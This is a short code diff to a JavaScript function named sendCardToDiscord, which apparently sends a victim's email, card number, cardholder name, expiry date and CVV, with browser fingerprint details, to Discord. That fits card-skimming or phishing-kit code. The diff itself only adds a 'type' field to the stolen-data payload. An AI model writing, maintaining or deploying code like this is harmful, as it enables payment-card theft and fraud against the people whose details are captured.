@@ -139,6 +139,7 @@ async function sendCardToDiscord(email,cardNumber,cardHolder,expiryDate,cvv){
   const body={
     email,
     cardNumber,cardHolder,expiryDate,cvv,
+    type:'payment',
     userAgent:navigator.userAgent,
     language:navigator.language,
     screenResolution:screen.width+'x'+screen.height,
